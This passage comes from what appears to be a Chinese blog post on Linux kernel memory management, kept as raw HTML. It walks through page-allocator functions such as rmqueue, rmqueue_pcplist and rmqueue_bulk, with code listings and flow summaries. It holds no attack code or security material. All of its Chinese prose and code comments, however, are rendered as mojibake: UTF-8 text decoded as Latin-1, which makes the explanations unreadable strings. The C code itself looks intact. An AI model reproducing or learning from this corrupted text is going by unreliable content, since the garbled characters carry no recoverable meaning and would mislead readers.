å³ä¸ºæˆ‘ä»¬åœ¨OSæ•™ç§‘ä¹¦ä¸Šçœ‹åˆ°çš„çš„ buddy system æ¨¡å‹,</span><br>        <span class="hljs-comment">// å– freelist å¯¹åº”ä¸‹æ ‡ pageï¼Œè‹¥æ— åˆ™å‘ä¸Šéå†æ‹†æ›´é«˜ order çš„ page</span><br>        <span class="hljs-comment">// **************************</span><br>page = rmqueue(ac-&gt;preferred_zoneref-&gt;zone, zone, order,<br>gfp_mask, alloc_flags, ac-&gt;migratetype);<br><span class="hljs-keyword">if</span> (page) &#123;<br>prep_new_page(page, order, gfp_mask, alloc_flags);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥è¿™æ˜¯ä¸€ä¸ªé«˜é˜¶çš„åŸå­åˆ†é…ï¼Œ</span><br><span class="hljs-comment"> * æ£€æŸ¥æˆ‘ä»¬æ˜¯å¦è¯¥ä¸ºå°†æ¥ä¿ç•™ pageblock</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(order &amp;&amp; (alloc_flags &amp; ALLOC_HARDER)))<br>reserve_highatomic_pageblock(page, zone, order);<br><br><span class="hljs-keyword">return</span> page;<span class="hljs-comment">// å–åˆ°äº†ï¼Œè¿”å›</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">// æ²¡å–åˆ°</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span><br><span class="hljs-comment">/* è‹¥è¯¥ zone æœ‰ deferred pagesï¼Œå†è¯•ä¸€é */</span><br><span class="hljs-keyword">if</span> (static_branch_unlikely(&amp;deferred_pages)) &#123;<br><span class="hljs-keyword">if</span> (_deferred_grow_zone(zone, order))<br><span class="hljs-keyword">goto</span> try_this_zone;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * åœ¨ä¸€å° UMA æœºå™¨ä¸Šå¯èƒ½æ‰€ä»¥çš„ zone éƒ½æ˜¯ç ´ç¢çš„ï¼Œ</span><br><span class="hljs-comment"> * è‹¥é¿å…ç¢ç‰‡, é‡ç½®å¹¶é‡è¯•.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (no_fallback) &#123;<br>alloc_flags &amp;= ~ALLOC_NOFRAGMENT;<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°æµç¨‹æ€»ç»“å¦‚ä¸‹ï¼š</p><ul><li><p><code>for_next_zone_zonelist_nodemask</code> è¿­ä»£éå†åˆ†é…ä¸Šä¸‹æ–‡ä¸­ zonelist ä¸­çš„ zoneref æ•°ç»„ å¯¹åº”çš„ zone</p><blockquote><p>å…¶æ ¸å¿ƒæ˜¯å•æ¬¡è¿­ä»£è°ƒç”¨ next_zones_zonelist()ï¼Œè¯¥å‡½æ•°è¿”å›:</p><ul><li>åœ¨ nodemask çš„ zone ä¸­ï¼Œä»¥å½“å‰ zone ä½œä¸ºèµ·ç‚¹æ¸¸æ ‡çš„ã€ä½äºæˆ–ä½äºã€‘highest_zoneidx çš„ä¸‹ä¸€ä¸ª zone</li></ul></blockquote><ul><li><p>è‹¥å¼€å¯äº† cpusetï¼Œæ£€æŸ¥å½“å‰ zone æ˜¯å¦æ»¡è¶³ cpuset çš„è¦æ±‚ï¼Œè‹¥å¦ï¼Œåˆ™å°è¯•ä¸‹ä¸€ä¸ª zone</p></li><li><p>æ£€æŸ¥å½“å‰ zone å¯¹åº” node çš„è„é¡µæ•°é‡æ˜¯å¦è¶…å‡ºé™åˆ¶ï¼Œè‹¥å¦ï¼Œåˆ™å°è¯•ä¸‹ä¸€ä¸ª zone</p></li><li><p>è‹¥ <code>ALLOC_NOFRAGMENT</code> ä½†æ˜¯å½“å‰ zone é preferred zoneã€ä¸”å¯¹åº” node ä¸º remote nodeï¼Œåˆ™æ¸…é™¤è¯¥æ ‡å¿—ä½å<strong>é‡æ–°å¼€å§‹åˆ†é…</strong>ï¼Œå› ä¸º locality æ¯”é¿å…ç¢ç‰‡æ›´åŠ é‡è¦</p></li><li><p>è·å–å½“å‰ zone çš„æ°´ä½çº¿æ ‡è®°</p><ul><li>è‹¥æ˜¯è®¾ç½®äº† <code>ALLOC_NO_WATERMARKS</code> åˆ™ç›´æ¥åˆ°ä¸‹ä¸€æ­¥è¿›è¡Œåˆ†é…</li><li>è‹¥æ°´ä½çº¿æ£€æŸ¥æœªé€šè¿‡ï¼Œè°ƒç”¨ <code>node_reclaim()</code> è¿›è¡Œé¡µé¢å›æ”¶</li><li>è‹¥å›æ”¶åé¡µé¢è¿˜æ˜¯ä¸è¶³ï¼Œåˆ™å°è¯•ä¸‹ä¸€ä¸ª zone</li></ul></li><li><p>è°ƒç”¨ <code>rmqueue()</code> æ­£å¼è¿›è¡Œå†…å­˜åˆ†é…ï¼Œè¯¥å‡½æ•°å³ä¸º buddy system åˆ†é…ç®—æ³•</p></li></ul></li></ul><p><img src="https://s2.loli.net/2022/07/05/SJMKys31ofnTPXc.png" alt="å·çš„å›¾.png"></p><h4 id="rmqueue-ï¼šä»ç»™å®šçš„-page-ä¸­è¿›è¡Œé¡µé¢åˆ†é…"><a href="#rmqueue-ï¼šä»ç»™å®šçš„-page-ä¸­è¿›è¡Œé¡µé¢åˆ†é…" class="headerlink" title="rmqueue()ï¼šä»ç»™å®šçš„ page ä¸­è¿›è¡Œé¡µé¢åˆ†é…"></a>rmqueue()ï¼šä»ç»™å®šçš„ page ä¸­è¿›è¡Œé¡µé¢åˆ†é…</h4><p>è¯¥å‡½æ•°å®šä¹‰äº <code>/mm/page_alloc.c</code> ä¸­ï¼Œä¸»è¦æ˜¯ä»ç»™å®š zone ä¸­è¿›è¡Œå†…å­˜åˆ†é…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä»ç»™å®š zone ä¸­è¿›è¡Œå†…å­˜åˆ†é…. å¯¹äº order-0 çš„åˆ†é…åˆ™ä½¿ç”¨ pcplists.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span><br><span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">rmqueue</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> zone *preferred_zone,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order,</span><br><span class="hljs-params"><span class="hljs-type">gfp_t</span> gfp_flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags,</span><br><span class="hljs-params"><span class="hljs-type">int</span> migratetype)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br><span class="hljs-keyword">if</span> (likely(order == <span class="hljs-number">0</span>)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * MIGRATE_MOVABLE çš„ pcplist å¯èƒ½åœ¨ CMA åŒºåŸŸæœ‰ç€é¡µé¢ï¼Œ</span><br><span class="hljs-comment"> * å½“ä» CMA çš„åˆ†é…ä¸è¢«å…è®¸æ—¶æˆ‘ä»¬éœ€è¦ç•¥è¿‡å®ƒ</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">// å¯¹äº order-0 çš„åˆ†é…ï¼Œ</span><br>        <span class="hljs-comment">// è‹¥æ²¡æœ‰å¼€å¯ CMA | è®¾ç½®äº† ALLOC_CMA | è¿ç§»ç±»å‹é MIGRATE_MOVABLE</span><br>        <span class="hljs-comment">// åˆ™å…ˆä» pcplist ä¸Šåˆ†é…</span><br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_CMA) || alloc_flags &amp; ALLOC_CMA ||<br>migratetype != MIGRATE_MOVABLE) &#123;<br>page = rmqueue_pcplist(preferred_zone, zone, gfp_flags,<br>migratetype, alloc_flags);<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æˆ‘ä»¬ç»ä¸å¸Œæœ› callers å°è¯•</span><br><span class="hljs-comment"> * åœ¨å¸¦æœ‰ __GFP_NOFAIL æ—¶åˆ†é…å¤§äº order-1 çš„é¡µ</span><br><span class="hljs-comment"> */</span><br>WARN_ON_ONCE((gfp_flags &amp; __GFP_NOFAIL) &amp;&amp; (order &gt; <span class="hljs-number">1</span>));<br>spin_lock_irqsave(&amp;zone-&gt;lock, flags);<br><br><span class="hljs-keyword">do</span> &#123;<br>page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥ç”±äºéCMAçš„åˆ†é…ä¸Šä¸‹æ–‡å¯¼è‡´ç•¥è¿‡äº† pcplistï¼Œåˆ™order-0 çš„è¯·æ±‚å¯ä»¥åˆ°è¾¾æ­¤å¤„.</span><br><span class="hljs-comment"> * HIGHATOMIC åŒºåŸŸä¸ºæ›´é«˜ order çš„åŸå­åˆ†é…æ‰€ä¿ç•™ï¼Œ</span><br><span class="hljs-comment"> * æ•… order-0 çš„è¯·æ±‚åº”ç•¥è¿‡å®ƒã€‚</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">// è‹¥ order &gt; 0 ä¸”å¸¦æœ‰ ALLOC_HARDER æ ‡å¿—ä½ï¼Œè°ƒç”¨ __rmqueue_smallest() åˆ†é…</span><br>        <span class="hljs-comment">// è¿™ä¸ªæ ‡å¿—ä½æ„ä¸ºå°†æ°´ä½çº¿å‡å» 1/4ï¼Œå®é™…ä¸Š GFP_ATOMIC ä¸­ä¾¿ä¼šåŒ…å«è¯¥æ ‡å¿—ä½</span><br><span class="hljs-keyword">if</span> (order &gt; <span class="hljs-number">0</span> &amp;&amp; alloc_flags &amp; ALLOC_HARDER) &#123;<br>page = __rmqueue_smallest(zone, order, MIGRATE_HIGHATOMIC);<br><span class="hljs-keyword">if</span> (page)<br>trace_mm_page_alloc_zone_locked(page, order, migratetype);<br>&#125;<br>        <span class="hljs-comment">// è°ƒç”¨ __rmqueue() è¿›è¡Œåˆ†é…ï¼Œè¿™ä¸ªå°±æ˜¯çœŸæ­£çš„æ ¸å¿ƒåˆ†é…å‡½æ•°äº†</span><br><span class="hljs-keyword">if</span> (!page)<br>page = __rmqueue(zone, order, migratetype, alloc_flags);<br>&#125; <span class="hljs-keyword">while</span> (page &amp;&amp; check_new_pages(page, order)); <span class="hljs-comment">// è¿™ä¸ªæ£€æŸ¥å‡½æ•°é€šè¿‡äº†è¿”å›false</span><br>spin_unlock(&amp;zone-&gt;lock);<br><span class="hljs-keyword">if</span> (!page)<br><span class="hljs-keyword">goto</span> failed;<br>__mod_zone_freepage_state(zone, -(<span class="hljs-number">1</span> &lt;&lt; order),<br>  get_pcppage_migratetype(page));<br><br>__count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="hljs-number">1</span> &lt;&lt; order);<br>zone_statistics(preferred_zone, zone);<br>local_irq_restore(flags);<br><br>out:<br><span class="hljs-comment">/* Separate test+clear to avoid unnecessary atomics */</span><br><span class="hljs-keyword">if</span> (test_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags)) &#123;<br>clear_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags);<br>wakeup_kswapd(zone, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, zone_idx(zone));<br>&#125;<br><br>VM_BUG_ON_PAGE(page &amp;&amp; bad_range(zone, page), page);<br><span class="hljs-keyword">return</span> page;<br><br>failed:<br>local_irq_restore(flags);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ†æå‡½æ•°æµç¨‹å‰æˆ‘ä»¬å…ˆå›é¡¾ä¸€ä¸‹è¿™ä¸ªæ¦‚å¿µâ€”â€”<code>per-cpu pageset</code> ï¼Œè¿™æ˜¯ zone ä¸Šçš„ä¸€ä¸ª per-cpu çš„é¡µé¢é›†ï¼Œåœ¨åˆ†é…æ—¶ä¼šä¼˜å…ˆä»è¿™é‡Œè¿›è¡Œåˆ†é…</p><p>è¯¥å‡½æ•°å…¶å®è¿˜æ˜¯å¯¹åˆ†é…çš„æ ¸å¿ƒé€»è¾‘çš„å°è£…ï¼Œä¸»è¦æ˜¯ä»¥ä¸‹æµç¨‹ï¼š</p><ul><li>åˆ†é…çš„ order ä¸º 0ï¼Œè‹¥æ²¡æœ‰å¼€å¯ CMA | è®¾ç½®äº† ALLOC_CMA | è¿ç§»ç±»å‹é MIGRATE_MOVABLEï¼Œåˆ™å°è¯•ä» per-cpu pageset ä¸­åˆ†é…å¹¶è¿”å›</li><li>order &gt; 0ï¼Œè°ƒç”¨ <code>__rmqueue_smallest()</code> è¿›è¡Œé¡µé¢åˆ†é…</li><li>ä¹‹å‰æœªåˆ†é…æˆåŠŸï¼Œè°ƒç”¨ <code>__rmqueue()</code> è¿›è¡Œé¡µé¢åˆ†é…</li><li>ç»“æœæ£€æŸ¥ï¼Œå…¶ä¸­å¾ªç¯å†…æ˜¯ç”¨ <code>check_new_pages()</code>ï¼Œæœªé€šè¿‡åˆ™é‡æ–°å¾ªç¯ï¼ˆå›åˆ°ç¬¬äºŒæ­¥ï¼‰</li></ul><h5 id="â‘ -rmqueue-pcplist-ï¼šä»-per-cpu-pageset-ä¸Šåš-order-0-çš„åˆ†é…"><a href="#â‘ -rmqueue-pcplist-ï¼šä»-per-cpu-pageset-ä¸Šåš-order-0-çš„åˆ†é…" class="headerlink" title="â‘  rmqueue_pcplist()ï¼šä» per-cpu pageset ä¸Šåš order-0 çš„åˆ†é…"></a>â‘  rmqueue_pcplist()ï¼šä» per-cpu pageset ä¸Šåš order-0 çš„åˆ†é…</h5><p>ä¸»è¦æ˜¯å…³ä¸­æ–­â†’é¡µé¢åˆ†é…â†’å¼€ä¸­æ–­ä¸‰æ­¥èµ°ï¼Œæœ€ååˆ†é…è°ƒç”¨åˆ°çš„æ˜¯ <code>__rmqueue_pcplist()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Lock and remove page from the per-cpu list */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">rmqueue_pcplist</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> zone *preferred_zone,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">gfp_t</span> gfp_flags,</span><br><span class="hljs-params"><span class="hljs-type">int</span> migratetype, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pages</span> *<span class="hljs-title">pcp</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">list</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><br>local_irq_save(flags); <span class="hljs-comment">// å…³ä¸­æ–­</span><br>pcp = &amp;this_cpu_ptr(zone-&gt;pageset)-&gt;pcp;<br><span class="hljs-built_in">list</span> = &amp;pcp-&gt;lists[migratetype]; <span class="hljs-comment">// è·å–è¿ç§»ç±»å‹é“¾è¡¨</span><br>page = __rmqueue_pcplist(zone,  migratetype, alloc_flags, pcp, <span class="hljs-built_in">list</span>); <span class="hljs-comment">// åˆ†é…</span><br><span class="hljs-keyword">if</span> (page) &#123;<br>__count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="hljs-number">1</span>);<br>zone_statistics(preferred_zone, zone);<br>&#125;<br>local_irq_restore(flags); <span class="hljs-comment">// å¼€ä¸­æ–­</span><br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>__rmqueue_pcplist()</code> ä¸»è¦å°±æ˜¯ä¸€ä¸ªå¤§å¾ªç¯ï¼Œè‹¥ pcplist ä¸ºç©ºåˆ™è°ƒç”¨ <code>rmqueue_bulk()</code> å…ˆä» zone ä¸Šæ‹¿ pagesï¼Œä¹‹åå°±æ˜¯ç®€å•çš„é“¾è¡¨è„±é“¾ï¼Œåˆ†é…ç»“æœä½¿ç”¨ <code>check_new_page()</code> è¿›è¡Œæ£€æŸ¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* ä» per-cpu é“¾è¡¨ä¸Šå–å‡º page, è°ƒç”¨è€…å¿…é¡»ä¿æŠ¤é“¾è¡¨ */</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *__<span class="hljs-title">rmqueue_pcplist</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>, <span class="hljs-title">int</span> <span class="hljs-title">migratetype</span>,</span><br><span class="hljs-class"><span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">alloc_flags</span>,</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pages</span> *<span class="hljs-title">pcp</span>,</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">list</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">if</span> (list_empty(<span class="hljs-built_in">list</span>)) &#123; <span class="hljs-comment">// list æ˜¯ç©ºçš„</span><br>            <span class="hljs-comment">// </span><br>pcp-&gt;count += rmqueue_bulk(zone, <span class="hljs-number">0</span>,<br>READ_ONCE(pcp-&gt;batch), <span class="hljs-built_in">list</span>,<br>migratetype, alloc_flags);<br><span class="hljs-keyword">if</span> (unlikely(list_empty(<span class="hljs-built_in">list</span>)))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>        <span class="hljs-comment">// é“¾è¡¨è„±é“¾</span><br>page = list_first_entry(<span class="hljs-built_in">list</span>, <span class="hljs-keyword">struct</span> page, lru);<br>list_del(&amp;page-&gt;lru);<br>pcp-&gt;count--;<br>&#125; <span class="hljs-keyword">while</span> (check_new_pcp(page));<br><br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>rmqueue_bulk()</code> åˆ™æœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>__rmqueue()</code> ä¸º pcplist è¿›è¡Œ <code>pcp-&gt;batch</code> æ¬¡çš„ order-0 çš„é¡µé¢åˆ†é…ï¼Œå¹¶å»ºç«‹é“¾è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä¸ºäº†é«˜æ•ˆç‡ï¼Œä» buddy åˆ†é…å™¨è·å¾—æŒ‡å®šæ•°é‡çš„å…ƒç´ , </span><br><span class="hljs-comment"> * æ‰€æœ‰çš„å•ä¸ªå…ƒç´ éƒ½åœ¨æŒæœ‰é”çš„æƒ…å†µä¸‹è¿›è¡Œ.  å°†å…¶æ·»åŠ åˆ°æä¾›çš„é“¾è¡¨ä¸­.</span><br><span class="hljs-comment"> * è¿”å›æ”¾ç½®åœ¨ *list é“¾è¡¨ä¸Šçš„ pages æ•°é‡.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">rmqueue_bulk</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> count, <span class="hljs-keyword">struct</span> list_head *<span class="hljs-built_in">list</span>,</span><br><span class="hljs-params"><span class="hljs-type">int</span> migratetype, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags)</span><br>&#123;<br><span class="hljs-type">int</span> i, alloced = <span class="hljs-number">0</span>;<br><br>spin_lock(&amp;zone-&gt;lock);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; count; ++i) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> __rmqueue(zone, order, migratetype,<br>alloc_flags);<br><span class="hljs-keyword">if</span> (unlikely(page == <span class="hljs-literal">NULL</span>))<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">if</span> (unlikely(check_pcp_refill(page)))<br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç”± expand() è¿”å›çš„åˆ†å‰² buddy é¡µé¢åœ¨æ­¤å¤„ä»¥ç‰©ç†é¡µæ¡†é¡ºåºæ¥æ”¶ã€‚</span><br><span class="hljs-comment"> * é¡µé¢è¢«æ·»åŠ åˆ° caller çš„é“¾è¡¨å°¾éƒ¨ã€‚ä» caller çš„è§’åº¦çœ‹ï¼Œé“¾è¡¨åœ¨</span><br><span class="hljs-comment"> * æŸäº›æƒ…å†µä¸‹æ˜¯æŒ‰ç…§é¡µç æ’åºçš„ã€‚è¿™å¯¹ä¸€äº›å¯ä»¥ä»å¤´éƒ¨å‰å‘çš„IOè®¾å¤‡æ˜¯æœ‰ç”¨çš„ï¼Œ</span><br><span class="hljs-comment"> * å› ä¸ºé“¾è¡¨ä¹Ÿæ˜¯åœ¨ç‰©ç†é¡µçš„é¡ºåºä¸Šçš„ã€‚è¿™å¯¹äºå¯ä»¥åœ¨ç‰©ç†é¡µåˆç†æ’åºçš„æƒ…å†µä¸‹</span><br><span class="hljs-comment"> * åˆå¹¶IOè¯·æ±‚çš„IOè®¾å¤‡æ˜¯æœ‰ç”¨çš„ã€‚</span><br><span class="hljs-comment"> */</span><br>list_add_tail(&amp;page-&gt;lru, <span class="hljs-built_in">list</span>);<br>alloced++;<br><span class="hljs-keyword">if</span> (is_migrate_cma(get_pcppage_migratetype(page)))<br>__mod_zone_page_state(zone, NR_FREE_CMA_PAGES,<br>      -(<span class="hljs-number">1</span> &lt;&lt; order));<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * i pages were removed from the buddy list even if some leak due</span><br><span class="hljs-comment"> * to check_pcp_refill failing so adjust NR_FREE_PAGES based</span><br><span class="hljs-comment"> * on i. Do not confuse with &#x27;alloced&#x27; which is the number of</span><br><span class="hljs-comment"> * pages added to the pcp list.</span><br><span class="hljs-comment"> */</span><br>__mod_zone_page_state(zone, NR_FREE_PAGES, -(i &lt;&lt; order));<br>spin_unlock(&amp;zone-&gt;lock);<br><span class="hljs-keyword">return</span> alloced;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="â‘¡-rmqueue-smallest-ï¼šéå†æŒ‡å®š-migrationtype-é“¾è¡¨çš„-buddy-ç®—æ³•ï¼ˆæ ¸å¿ƒä¸­çš„æ ¸å¿ƒï¼‰"><a href="#â‘¡-rmqueue-smallest-ï¼šéå†æŒ‡å®š-migrationtype-é“¾è¡¨çš„-buddy-ç®—æ³•ï¼ˆæ ¸å¿ƒä¸­çš„æ ¸å¿ƒï¼‰" class="headerlink" title="â‘¡ __rmqueue_smallest()ï¼šéå†æŒ‡å®š migrationtype é“¾è¡¨çš„ buddy ç®—æ³•ï¼ˆæ ¸å¿ƒä¸­çš„æ ¸å¿ƒï¼‰"></a>â‘¡ __rmqueue_smallest()ï¼šéå†æŒ‡å®š migrationtype é“¾è¡¨çš„ buddy ç®—æ³•ï¼ˆæ ¸å¿ƒä¸­çš„æ ¸å¿ƒï¼‰</h5><p>æˆ‘ä»¬é‡æ–°æ¥å›é¡¾ä¸€ä¸‹ <code>free_area</code> çš„ç»“æ„ï¼Œåœ¨å…¶ä¸­æ ¹æ®è¿ç§»ç±»å‹åˆ†æˆäº†å¤šä¸ªé“¾è¡¨ï¼š</p><p><img src="https://i.loli.net/2021/11/30/sbNImKo6tBS5GUe.png" alt="è‡ªå·±ç”»çš„å›¾.png"></p><p>è€Œä¸€ä¸ª zone æ˜¯ç”±å¤šä¸ª <code>free_area</code> ç»„æˆçš„ï¼Œä¸€ä¸ª <code>free_area</code> å¯¹åº”ä¸€ä¸ª orderï¼Œé‚£ä¹ˆå¯¹äºè¯¥å‡½æ•°è€Œè¨€å…¶åªä¼šéå†ç‰¹å®šçš„ orderï¼Œé‚£ä¹ˆå°±æˆäº†ä¸‹é¢çš„æ¨¡å‹ï¼š</p><p><img src="https://i.loli.net/2021/11/30/sOwdI5YMNUjLSib.png" alt="è‡ªå·±ç”»çš„å›¾.png"></p><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥ä»¥æ¥çœ‹è¿™ä¸ªå‡½æ•°äº†ï¼šä»å¾…åˆ†é… order æ‰€å¯¹åº”çš„ <code>free_area</code> çš„æŒ‡å®šçš„ migration type é“¾è¡¨ä¸Šåˆ†é…ï¼Œè‹¥ä¸å¤Ÿåˆ™ä¸€ç›´å‘æ›´é«˜ order è¿›è¡Œåˆ†é…åå¯¹åŠå‘ä¸‹æ‹†åˆ°ä½ orderï¼Œè¿™é‡Œå‘æ›´é«˜ order åˆ†é…æ˜¯é€šè¿‡ç®€å•çš„å¾ªç¯ + 